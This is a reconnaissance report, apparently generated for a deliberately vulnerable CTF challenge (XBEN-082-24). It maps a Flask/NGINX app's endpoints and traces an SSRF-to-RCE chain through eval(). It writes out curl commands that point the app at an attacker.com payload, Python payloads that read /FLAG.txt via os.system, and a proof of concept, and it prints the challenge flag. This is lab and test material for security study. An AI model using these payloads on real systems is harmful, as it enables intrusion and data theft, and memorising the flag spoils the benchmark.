# Reconnaissance Deliverable: XBEN-082-24

## 0) HOW TO READ THIS
This reconnaissance report provides a comprehensive map of the application's attack surface. This is a deliberately vulnerable CTF challenge with **NO AUTHENTICATION, NO AUTHORIZATION, and CRITICAL CODE EXECUTION VULNERABILITIES**.

**Key Sections Overview:**
- **Section 1 (Executive Summary):** High-level overview of the application and critical findings
- **Section 2 (Technology & Service Map):** Complete technology stack and infrastructure
- **Section 3 (Authentication & Session Management):** Analysis of auth mechanisms (NONE EXIST in this app)
- **Section 4 (API Endpoint Inventory):** All 11 network-accessible endpoints with authorization details
- **Section 5 (Input Vectors):** Every location where the application accepts user input
- **Section 6 (Network & Interaction Map):** System boundaries, data flows, and security guards
- **Section 7 (Role & Privilege Architecture):** Role hierarchy and privilege mapping (NONE EXIST)
- **Section 8 (Authorization Vulnerability Candidates):** N/A - no authorization exists
- **Section 9 (Injection Sources):** Command and SQL injection sources (NONE - but critical RCE via eval exists)

**Priority for Vulnerability Analysis:**
1. **CRITICAL:** SSRF-to-RCE chain via `/api/set` → `/app` → `eval()`
2. **HIGH:** Stored XSS via `/name/set` → template rendering
3. **MEDIUM:** Information disclosure via `/api/get` and `/name/get`

## 1. Executive Summary

XBEN-082-24 is a deliberately vulnerable CTF challenge implementing a microservices architecture with critical security deficiencies. The application consists of three Docker containers: an NGINX reverse proxy and two Flask services (flask_app and flask_api). The security posture is **CRITICALLY INSECURE** by design, with **NO AUTHENTICATION, NO AUTHORIZATION**, and **MULTIPLE SEVERE CODE EXECUTION VULNERABILITIES**.

### Core Purpose
The application is a proof-of-concept demonstrating a chained SSRF-to-RCE vulnerability pattern. It presents a simple dashboard that fetches and executes Python code from a configurable API endpoint.

### Primary Technology Stack
- **Frontend:** Static HTML/JavaScript served by NGINX
- **Backend:** Python 3.8 with Flask 3.0.3 (two separate microservices)
- **Reverse Proxy:** NGINX with NJS (NGINX JavaScript) module
- **Infrastructure:** Docker Compose orchestration, no database
- **Hosting:** Localhost deployment on ports 80, 8080 (internal), and 8081

### Critical Attack Surface Components

**Most Critical Vulnerability Chain:**
1. **SSRF Enabler:** `/api/set?url=<attacker_url>` - Unauthenticated endpoint allows setting arbitrary API URL
2. **SSRF Sink:** `/app` endpoint fetches from attacker-controlled URL
3. **RCE Sink:** `eval(json.loads(script)["script"])` executes fetched code with full Python capabilities

**Complete Attack Flow:**
```
Attacker: GET /api/set?url=http://attacker.com/malicious.json
          → NGINX writes to /tmp/apiurl (world-writable)
Victim:   GET /app
          → Flask reads /tmp/apiurl
          → Flask: requests.get("http://attacker.com/malicious.json")
          → Attacker responds: {"script": "__import__('os').system('cat /FLAG.txt')"}
          → Flask: eval("__import__('os').system('cat /FLAG.txt')")
          → Command executed, flag exfiltrated
```

### Security Posture Summary
- **Authentication:** NONE - All 11 endpoints are publicly accessible
- **Authorization:** NONE - No role-based access control or permission checks
- **Input Validation:** NONE - All user input accepted without sanitization
- **Output Encoding:** Relies on Jinja2 auto-escaping (XSS potential exists)
- **Session Management:** NONE - No session cookies, no user tracking
- **Encryption:** NONE - All traffic over HTTP, no TLS/HTTPS
- **Rate Limiting:** NONE - Unlimited requests to all endpoints

## 2. Technology & Service Map

### Frontend
- **Framework:** Static HTML5 with vanilla JavaScript
- **Key Files:**
  - `/nginx/html/index.html` - Dashboard interface
  - `/nginx/html/script.js` - Client-side API interaction (safe DOM methods)
- **Authentication Libraries:** NONE
- **Rendering:** Server-side via Jinja2 templates, client-side via DOM manipulation

### Backend
- **Language:** Python 3.8-slim (Debian-based) - **EOL October 2024**
- **Framework:** Flask 3.0.3 (two separate applications)
- **Key Dependencies:**
  - Flask==3.0.3 (web framework)
  - requests (HTTP client library, **no version pinning**)
- **Application Structure:**
  - **flask_app** (Port 8080): Main application with eval() RCE vulnerability
  - **flask_api** (Port 8081): Microservice providing default script endpoint
- **Debug Mode:** `debug=True` in production - exposes Werkzeug interactive debugger

### Infrastructure
- **Hosting Provider:** Local Docker deployment
- **CDN:** NONE
- **Database Type:** NONE - Uses filesystem storage (`/tmp/name`, `/tmp/apiurl`, `/FLAG.txt`)
- **Container Orchestration:** Docker Compose with 3 services
- **Health Checks:** All services implement health check endpoints with Docker monitoring

### Identified Subdomains
**From subfinder scan (not directly relevant to localhost deployment):**
- fndlync01.5ninesdata.localhost
- autodiscover.localhost
- mse-ca-mail.corp.mse.localhost
- autodiscover.regency.localhost
- mail.regency.localhost
- exchvm.nwcnet.localhost
- naeu2.naeuinc.localhost
- sbs.allsaintsschool.localhost
- server2.hunter.localhost
- mail03.regency.localhost
- owa.regency.localhost
- www.localhost
- server02.counterintel.localhost
- mail.localhost
- mail02.regency.localhost
- tools.sonoma.edu.localhost

**Note:** These subdomains are from local machine DNS entries, not related to the target application.

### Open Ports & Services
**From nmap scan:**

| Port | Service | Version | Purpose | Security Concerns |
|------|---------|---------|---------|-------------------|
| 80/tcp | HTTP | Caddy httpd | NGINX reverse proxy (target app) | No TLS, publicly accessible |
| 443/tcp | SSL/HTTPS | - | Not configured for target app | Target app not using HTTPS |
| 631/tcp | IPP | CUPS 2.3 | Print service (local machine) | Not related to target app |
| 9999/tcp | HTTP | SimpleHTTPServer 0.6 (Python 3.12.10) | Development server (local machine) | Not related to target app |
| 49158/tcp | HTTP | Golang net/http | Tailscale service (local machine) | Not related to target app |

**Target Application Ports:**
- **Port 41663 (mapped to 80):** Main NGINX entry point - All endpoints accessible here
- **Port 8080:** Flask app (internal only, proxied via NGINX)
- **Port 8081:** Flask API (exposed externally, also proxied via NGINX)

### Docker Service Architecture
```
Internet (Port 41663 → 80)
         ↓
    [NGINX Container]
    - Reverse proxy/API gateway
    - NJS JavaScript runtime
    - Static file serving
    - Routes: /, /api/*, /name/*, /app
         ↓
    ┌────┴────┐
    ↓         ↓
[flask_app]  [flask_api]
Port 8080    Port 8081
(Internal)   (External)
    ↓            ↓
/FLAG.txt    /script endpoint
```

### Configuration Files
- **Docker Compose:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/docker-compose.yml`
- **Environment Variables:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/.env` (contains FLAG in plaintext)
- **NGINX Config:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/nginx/nginx.conf`
- **NJS Handlers:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/nginx/conf.d/helper.js`
- **Flask App:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/app/app.py`
- **Flask API:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/api/app.py`

## 3. Authentication & Session Management Flow

### Authentication Status: **COMPLETELY ABSENT**

This application has **NO AUTHENTICATION SYSTEM WHATSOEVER**. All endpoints are publicly accessible without any form of identity verification, credential validation, or access control.

### Entry Points
**NO AUTHENTICATION ENTRY POINTS EXIST**

The application does not implement:
- Login endpoint (no `/login`, `/signin`, `/auth`)
- Registration endpoint (no `/register`, `/signup`)
- SSO/OAuth endpoints (no `/auth/callback`, `/oauth/*`)
- Password reset endpoint (no `/password/reset`, `/forgot-password`)
- Logout endpoint (no `/logout`, `/signout`)

### Mechanism
**NO AUTHENTICATION MECHANISM IMPLEMENTED**

**Evidence from Flask Application:**
```python
# /Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/app/app.py (Lines 1-5)
from flask import Flask, redirect, url_for, render_template
import requests
import json

app = Flask(__name__)
# NO app.secret_key configured
# NO Flask-Login imported
# NO authentication decorators defined
```

**Missing Components:**
- Session-based authentication (Flask-Login)
- Token-based authentication (JWT, OAuth)
- API key validation
- HTTP Basic Auth
- Certificate-based authentication
- Multi-factor authentication (MFA/2FA)

### Code Pointers
**NO AUTHENTICATION CODE EXISTS**

**Files Analyzed for Authentication Logic:**
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/app/app.py` - No authentication logic
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/api/app.py` - No authentication logic
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/nginx/nginx.conf` - No auth_basic, no auth_request directives
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/nginx/conf.d/helper.js` - No authentication checks

**Dependencies Analysis:**
```
# /Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/app/requirements.txt
Flask==3.0.3
requests
# NO Flask-Login, NO Flask-JWT-Extended, NO authentication libraries

# /Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/api/requirements.txt
Flask==3.0.3
# NO authentication libraries
```

### 3.1 Role Assignment Process

**Role Determination:** NOT APPLICABLE - No user roles exist
**Default Role:** NOT APPLICABLE - No authentication, all users are anonymous
**Role Upgrade Path:** NOT APPLICABLE - No role hierarchy exists
**Code Implementation:** NONE

### 3.2 Privilege Storage & Validation

**Storage Location:** NOT APPLICABLE - No user privileges tracked
**Validation Points:** NONE - No authorization checks at any endpoint
**Cache/Session Persistence:** NOT APPLICABLE - No sessions exist
**Code Pointers:** NONE

**Evidence:**
```python
# All routes are completely open:
@app.route('/app')
def home():
    # NO @login_required decorator
    # NO permission checks
    # NO user context
    api = requests.get('http://nginx/api/get').text
    script = requests.get(api).text
    eval_result = eval(json.loads(script)["script"])
    return render_template('index.html', api=api, name=name, eval_result=eval_result)
```

### 3.3 Role Switching & Impersonation

**Impersonation Features:** NOT IMPLEMENTED
**Role Switching:** NOT IMPLEMENTED
**Audit Trail:** NOT IMPLEMENTED
**Code Implementation:** NONE

## 4. API Endpoint Inventory

All discovered network-accessible API endpoints with authorization details for vulnerability analysis.

| Method | Endpoint Path | Required Role | Object ID Parameters | Authorization Mechanism | Description & Code Pointer |
|--------|---------------|---------------|---------------------|-------------------------|---------------------------|
| GET | `/` | anon | None | None | Serves static dashboard HTML. `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/nginx/nginx.conf:14-18` |
| GET | `/healthcheck` | anon | None | None | NGINX health check endpoint. `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/nginx/nginx.conf:20-23` |
| GET/POST | `/api/set` | anon | None | None | **CRITICAL SSRF:** Sets API URL via ?url= parameter. NO validation. `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/nginx/conf.d/helper.js:39-48` |
| GET | `/api/get` | anon | None | None | Returns stored API URL from /tmp/apiurl. `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/nginx/conf.d/helper.js:34-37` |
| GET | `/name` | anon | None | None | Returns stored name from /tmp/name. `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/nginx/conf.d/helper.js:23-26` |
| GET/POST | `/name/set` | anon | None | None | Sets name via ?name= parameter. Potential XSS. `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/nginx/conf.d/helper.js:12-21` |
| GET | `/app` | anon | None | None | **CRITICAL RCE:** Fetches from API URL and executes via eval(). `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/app/app.py:7-15` |
| GET | `/app/healthcheck` | anon | None | None | Flask app health check (internal port 8080). `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/app/app.py:18-20` |
| GET | `/` (port 8081) | anon | None | None | Flask API welcome message. `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/api/app.py:6-8` |
| GET | `/healthcheck` (port 8081) | anon | None | None | Flask API health check. `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/api/app.py:10-12` |
| GET | `/script` | anon | None | None | Returns default script JSON: {"script": "'OK ' * 4"}. `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/api/app.py:14-16` |

### Endpoint Details

#### Critical Endpoints Requiring Immediate Analysis

**1. `/api/set?url=<value>` - SSRF Vulnerability**
- **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/nginx/conf.d/helper.js:39-48`
- **Validation:** NONE - Accepts any string as URL
- **Impact:** Enables SSRF attack chain leading to RCE
- **Attack Vector:** `curl "http://localhost:41663/api/set?url=http://attacker.com/payload.json"`

**2. `/app` - Remote Code Execution**
- **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/app/app.py:7-15`
- **Dangerous Code:** Line 11 - `eval_result = eval(json.loads(script)["script"])`
- **Impact:** Arbitrary Python code execution
- **Prerequisites:** Requires attacker to control API URL via `/api/set`

**3. `/name/set?name=<value>` - Stored XSS Potential**
- **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/nginx/conf.d/helper.js:12-21`
- **Validation:** NONE - Accepts any string
- **Impact:** Potential stored XSS (mitigated by Jinja2 auto-escaping)
- **Template Rendering:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/app/templates/index.html:43`

## 5. Potential Input Vectors for Vulnerability Analysis

This section lists every location where the network-accessible application accepts user-controlled input.

### URL Parameters (Query Strings)

**1. `url` parameter - /api/set endpoint**
- **Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/nginx/conf.d/helper.js:41`
- **Code:** `let args = r.args; if (args.url) { apiURL = args.url; }`
- **Validation:** NONE
- **Data Flow:** Query param → NJS variable → /tmp/apiurl file → requests.get() → eval()
- **Dangerous Sinks:** SSRF (line 10 of app.py), RCE (line 11 of app.py)

**2. `name` parameter - /name/set endpoint**
- **Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/nginx/conf.d/helper.js:14`
- **Code:** `let args = r.args; if (args.name) { name = args.name; }`
- **Validation:** NONE
- **Data Flow:** Query param → NJS variable → /tmp/name file → template rendering
- **Dangerous Sinks:** Stored XSS (template rendering at index.html:43)

### POST Body Fields (JSON/Form)
**NONE** - No endpoints accept POST body data. All parameters are via query strings.

### HTTP Headers
**Headers Forwarded by NGINX:**
- **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/nginx/nginx.conf:48-52`
- **Headers:**
  - `X-Real-IP` (from `$remote_addr`)
  - `X-Forwarded-For` (from `$proxy_add_x_forwarded_for`)
  - `X-Forwarded-Proto` (from `$scheme`)
  - `Host` (from `$host`)

**Processing:** These headers are forwarded but **NOT processed** by Flask application. No custom header handling detected.

**Potential Attack Vectors:** NONE - Headers are not read or used by application logic.

### Cookie Values
**NO COOKIES USED**
- No session cookies set
- No authentication cookies
- No tracking cookies
- No `Set-Cookie` headers in responses
- Flask secret_key not configured (required for session cookies)

**Evidence:**
```python
# /Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/app/app.py
app = Flask(__name__)
# NO app.secret_key = '...'
# NO session cookie configuration
```

### File Uploads
**NOT IMPLEMENTED** - No file upload endpoints exist.

### Complete Input Vector Summary

| Input Vector | Parameter Name | Endpoint | File:Line | Validation | Dangerous Sink |
|-------------|---------------|----------|-----------|------------|----------------|
| Query Param | `url` | `/api/set` | helper.js:41 | NONE | SSRF→RCE (app.py:10-11) |
| Query Param | `name` | `/name/set` | helper.js:14 | NONE | XSS (index.html:43) |

## 6. Network & Interaction Map

This section maps the system's network interactions for components within the attack surface scope.

### 6.1 Entities

| Title | Type | Zone | Tech | Data | Notes |
|-------|------|------|------|------|-------|
| User Browser | ExternAsset | Internet | Browser | Public | External attacker/user |
| NGINX Proxy | Service | Edge | NGINX Alpine + NJS | Config | Main entry point, port 80/8081 |
| Flask App | Service | App | Python 3.8/Flask 3.0.3 | PII, Secrets | Main application with RCE vulnerability |
| Flask API | Service | App | Python 3.8/Flask 3.0.3 | Public | Microservice providing script endpoint |
| Config Files | DataStore | Edge | Filesystem | Config | /tmp/apiurl and /tmp/name (777 permissions) |
| FLAG File | DataStore | App | Filesystem | Secrets | /FLAG.txt in flask_app container |

### 6.2 Entity Metadata

| Title | Metadata |
|-------|----------|
| NGINX Proxy | Hosts: http://localhost:41663; Endpoints: /, /api/*, /name/*, /app; Auth: None; Dependencies: Flask App, Flask API, Config Files |
| Flask App | Hosts: http://flask_app:8080; Endpoints: /app, /healthcheck; Auth: None; Dependencies: NGINX Proxy (for API URL), Config Files; Vulnerabilities: SSRF (line 10), RCE via eval() (line 11) |
| Flask API | Hosts: http://flask_api:8081; Endpoints: /, /healthcheck, /script; Auth: None; Dependencies: None |
| Config Files | Location: /tmp/apiurl, /tmp/name; Permissions: 777 (world-writable); Format: Plaintext; Consumers: NGINX NJS, Flask App |
| FLAG File | Location: /FLAG.txt; Permissions: Standard (likely 644); Format: Plaintext; Value: flag{6a221da4-597c-4dea-98c2-4f2417dd77e7}; Protection: NONE |

### 6.3 Flows (Connections)

| FROM → TO | Channel | Path/Port | Guards | Touches |
|-----------|---------|-----------|--------|---------|
| User Browser → NGINX Proxy | HTTPS | :41663 (→80) / | None | Public |
| User Browser → NGINX Proxy | HTTPS | :41663 /api/set?url= | None | Config (SSRF attack) |
| User Browser → NGINX Proxy | HTTPS | :41663 /name/set?name= | None | Config (XSS attack) |
| User Browser → NGINX Proxy | HTTPS | :41663 /app | None | Public (triggers RCE) |
| NGINX Proxy → Flask App | HTTP | :8080 /app | None | Public |
| Flask App → NGINX Proxy | HTTP | :80 /api/get | None | Config |
| Flask App → NGINX Proxy | HTTP | :80 /name/get | None | Config |
| Flask App → External URL | HTTP | Attacker-controlled | None | Secrets (SSRF) |
| NGINX NJS → Config Files | File | /tmp/apiurl (write) | None | Config |
| NGINX NJS → Config Files | File | /tmp/name (write) | None | Config |
| Flask App → FLAG File | File | /FLAG.txt (read via RCE) | None | Secrets |

### 6.4 Guards Directory

| Guard Name | Category | Statement |
|------------|----------|-----------|
| None | Auth | **NO GUARDS EXIST** - All flows are unprotected |
| world-writable | FileSystem | /tmp/apiurl and /tmp/name have 777 permissions - any process can read/write |
| http-only | Protocol | All traffic over HTTP (no HTTPS/TLS) - vulnerable to MITM |
| no-validation | Input | No input validation guards - all user input accepted as-is |
| debug-mode | Env | Flask apps run with debug=True - exposes Werkzeug debugger |

**Note:** This application intentionally has NO security guards or access controls.

## 7. Role & Privilege Architecture

### **CRITICAL FINDING: NO AUTHORIZATION ARCHITECTURE EXISTS**

After comprehensive analysis, this application has **ZERO roles, ZERO privilege levels, and ZERO authorization controls**.

### 7.1 Discovered Roles

**NO ROLES FOUND**

| Role Name | Privilege Level | Scope/Domain | Code Implementation |
|-----------|----------------|--------------|---------------------|
| (anonymous) | 0 | Global | All endpoints publicly accessible - no authentication exists |

**Evidence:**
- No role enums or constants defined
- No user model with role field
- No database to store roles
- No role-checking decorators
- No Flask-Login or similar authentication library

### 7.2 Privilege Lattice

**NOT APPLICABLE** - No roles exist to form a hierarchy.

```
Privilege Ordering: NONE - Single anonymous access level for all users

All users = anonymous = full access to all endpoints
```

### 7.3 Role Entry Points

| Role | Default Landing Page | Accessible Route Patterns | Authentication Method |
|------|---------------------|--------------------------|----------------------|
| (all users) | `/` or `/app` | All 11 endpoints (/, /app, /api/*, /name/*, /script, /healthcheck) | None - no authentication |

### 7.4 Role-to-Code Mapping

| Role | Middleware/Guards | Permission Checks | Storage Location |
|------|-------------------|-------------------|------------------|
| (all users) | NONE | NONE | N/A - no user identity tracking |

**Evidence:**
```python
# All routes have zero authorization:
@app.route('/app')
def home():
    # NO decorator like @login_required
    # NO inline check like `if not current_user.is_authenticated`
    # Direct execution
```

## 8. Authorization Vulnerability Candidates

**NOT APPLICABLE** - This section is designed for applications with authorization controls. Since this application has **NO AUTHORIZATION WHATSOEVER**, there are no authorization vulnerabilities to analyze.

**Instead, the vulnerability is the complete absence of access control:**
- All 11 endpoints are publicly accessible
- No authentication required for any functionality
- No authorization checks for any operations
- Critical endpoints (SSRF, RCE) are unauthenticated

### Security Impact

**Risk Level:** CRITICAL

**Exploitable Vulnerabilities Due to Missing Authorization:**
1. **Remote Code Execution** - Any anonymous user can execute arbitrary Python code
2. **Server-Side Request Forgery** - Any anonymous user can make the server fetch from arbitrary URLs
3. **Configuration Tampering** - Any anonymous user can modify application configuration
4. **Flag Access** - Any anonymous user who achieves RCE can read /FLAG.txt

## 9. Injection Sources (Command Injection and SQL Injection)

### **CRITICAL FINDING: NO Traditional Command/SQL Injection - But Critical RCE via eval()**

After comprehensive analysis, this application does **NOT** have traditional command injection or SQL injection vulnerabilities as defined in the classical sense. However, it has a **CRITICAL REMOTE CODE EXECUTION** vulnerability that is more severe.

### 9.1 Command Injection Sources

**FINDING: ZERO traditional command injection sources**

**Comprehensive Search Performed:**
- ✅ Searched for `os.system()` - NOT FOUND
- ✅ Searched for `subprocess.call()`, `subprocess.Popen()` - NOT FOUND
- ✅ Searched for `os.popen()` - NOT FOUND
- ✅ Searched for `child_process.exec()` (Node.js) - NOT FOUND
- ✅ Searched for shell command construction - NOT FOUND

**Files Analyzed:**
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/app/app.py` - No command execution
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/api/app.py` - No command execution
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/nginx/conf.d/helper.js` - No command execution

**Why No Command Injection:**
The application does not invoke shell commands or construct command strings from user input. It uses:
- HTTP requests (`requests.get()`)
- File system operations (`fs.writeFileSync()`, `fs.readFileSync()`)
- Direct code execution (`eval()`)

### 9.2 SQL Injection Sources

**FINDING: ZERO SQL injection sources**

**Reason:** This application has **NO DATABASE WHATSOEVER**.

**Evidence:**
```python
# /Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/app/requirements.txt
Flask==3.0.3
requests
# NO database libraries: no psycopg2, no pymysql, no SQLAlchemy, no sqlite3

# /Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/api/requirements.txt
Flask==3.0.3
# NO database libraries
```

**Data Storage:** Uses filesystem instead of database:
- `/tmp/apiurl` - Stores API URL configuration
- `/tmp/name` - Stores name configuration
- `/FLAG.txt` - Stores CTF flag

**No SQL Queries:** Application contains zero SQL statements, database connections, or ORM queries.

### 9.3 Critical Code Execution Vulnerability (NOT Command/SQL Injection)

**IMPORTANT:** While this is not command or SQL injection, it is a **MORE SEVERE** vulnerability.

#### **Source #1: Remote Code Execution via eval()**

**Input Origin:** `url` parameter from `/api/set` endpoint
- **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/nginx/conf.d/helper.js:41`

**Complete Data Flow:**

**Step 1: User Input Reception**
- **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/nginx/conf.d/helper.js:40-42`
```javascript
let args = r.args;
if (args.url) {
    apiURL = args.url;  // User-controlled input
```

**Step 2: Persistence to File**
- **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/nginx/conf.d/helper.js:43`
```javascript
fs.writeFileSync(apiURLFile, apiURL);  // Writes to /tmp/apiurl
```

**Step 3: Retrieval by Flask App**
- **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/app/app.py:9`
```python
api = requests.get('http://nginx/api/get').text  # Reads attacker-controlled URL
```

**Step 4: SSRF - Fetch from Attacker URL**
- **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/app/app.py:10`
```python
script = requests.get(api).text  # Makes HTTP request to attacker server
```

**Step 5: RCE - Code Execution**
- **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/app/app.py:11`
```python
eval_result = eval(json.loads(script)["script"])  # EXECUTES ARBITRARY PYTHON CODE
```

**Dangerous Sink:** `eval()` - Executes arbitrary Python expressions
- **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/app/app.py:11`
- **Function:** `eval(json.loads(script)["script"])`
- **Impact:** Full Python code execution with Flask app privileges

**Validation:** **NONE** at any stage
- No URL validation (step 1)
- No protocol whitelist (step 4)
- No response content validation (step 5)
- No input sanitization before eval()

**Exploitability:** **CRITICAL - Trivially exploitable**

**Proof of Concept:**
```bash
# Step 1: Host malicious JSON at attacker.com/payload.json
# Content: {"script": "__import__('subprocess').getoutput('cat /FLAG.txt')"}

# Step 2: Set malicious API URL
curl "http://localhost:41663/api/set?url=http://attacker.com/payload.json"

# Step 3: Trigger code execution
curl "http://localhost:41663/app"
# Response will contain the FLAG value
```

**Attack Capabilities:**
- Read /FLAG.txt file
- Execute arbitrary system commands (via `__import__('os').system()`)
- Exfiltrate data
- Establish reverse shell
- Read environment variables
- Access Docker container filesystem

### 9.4 Why eval() is NOT Traditional Injection

**Important Distinction:**
- **Command Injection:** User input flows into shell command execution (system(), exec())
- **SQL Injection:** User input flows into database queries
- **Code Injection (this case):** User input flows into code interpreter (eval())

The `eval()` function executes Python code **within the same process**, not by spawning a shell. However, an attacker can still execute shell commands by using `eval("__import__('os').system('command')")`.

**Classification:** This is **Arbitrary Code Execution** or **Code Injection**, which is often more severe than command injection because it provides direct access to the interpreter.

### Summary

**Traditional Injection Sources:** ZERO
- Command Injection: NOT FOUND
- SQL Injection: NOT APPLICABLE (no database)

**Critical Code Execution:** ONE (more severe than traditional injection)
- Remote Code Execution via eval(): FOUND at `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/app/app.py:11`
- Complete attack chain from user input to arbitrary code execution
- No validation or sanitization at any stage
- Trivially exploitable by any unauthenticated user

---

## Conclusion

This reconnaissance analysis provides a comprehensive map of the XBEN-082-24 attack surface. The application is a deliberately vulnerable CTF challenge with:

- **11 network-accessible endpoints** - All unauthenticated
- **Critical SSRF-to-RCE chain** - Allows complete server compromise
- **Zero security controls** - No authentication, authorization, input validation, or encryption
- **World-writable configuration files** - /tmp/apiurl and /tmp/name (777 permissions)
- **Debug mode enabled** - Flask apps expose Werkzeug debugger
- **Plaintext secrets** - FLAG stored unencrypted in .env and /FLAG.txt

**Primary Attack Vector:**
```
/api/set?url=http://attacker.com/payload
  → /tmp/apiurl (persistent storage)
  → /app endpoint
  → requests.get(attacker_url)
  → eval(attacker_response["script"])
  → Remote Code Execution
```

This analysis provides the foundation for all subsequent vulnerability analysis specialists to perform targeted security assessments.